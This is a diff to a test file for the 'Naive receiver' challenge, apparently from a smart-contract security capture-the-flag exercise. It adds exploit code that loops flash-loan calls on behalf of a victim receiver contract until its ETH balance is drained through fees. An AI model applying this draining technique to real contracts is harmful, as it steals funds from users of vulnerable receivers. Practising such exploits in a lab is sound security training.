@@ -30,6 +30,15 @@ describe('[Challenge] Naive receiver', function () {
     });
 
     it('Exploit', async function () {
+        console.log(ethers.utils.parseEther("11"))
+        while(true)
+        {
+            await this.pool.flashLoan(this.receiver.address, ethers.utils.parseEther("9"));
+        const currentBalance= await ethers.provider.getBalance(this.receiver.address)
+        console.log(`New receiver's balance`, (currentBalance).toString());
+        if(Number(currentBalance)===0)
+            break;
+    }
         /** CODE YOUR EXPLOIT HERE */   
     });
 
